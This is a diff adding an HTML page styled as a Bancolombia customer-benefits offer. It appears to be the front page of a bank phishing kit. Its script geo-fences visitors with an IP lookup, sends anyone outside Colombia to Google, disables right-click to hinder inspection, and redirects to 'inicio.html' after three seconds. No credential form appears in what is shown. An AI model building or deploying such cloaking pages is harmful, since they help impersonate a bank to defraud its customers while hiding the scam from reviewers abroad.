@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beneficios para clientes Bancolombia</title>
+
+ 
+      <script>
+    // Función para redirigir después de 25 segundos
+    function redirigir() {
+        window.location.href = "inicio.html";
+    }
+
+    // Configurar la redirección automática
+    setTimeout(redirigir, 3000); // 25000 milisegundos = 25 segundos
+
+    // Verificar la ubicación del usuario
+    function verificarUbicacion() {
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            if (data.country_code !== 'CO') {
+                alert('Solo para clientes Bancolombia');
+                window.location.href = "https://www.google.com"; // Redirigir a otro sitio si no está en Colombia
+            }
+        })
+        .catch(error => {
+            console.error('Error al verificar la ubicación:', error);
+            alert('');
+        });
+    }
+
+    // Deshabilitar el clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Ejecutar al cargar la página
+    window.onload = function() {
+        verificarUbicacion(); // Verificar ubicación
+    };
+</script>
+
+    </script>
+</head>
+<body style="background-color:#FCFCFF ;">
+
+<center>
+    <br><br><br><br><br><br><br>
+    <div>
+        <img style="width: 250px;" src="archivos/dina.gif" alt="">
+    </div>
+</center>
+
+</body>
+</html>
+
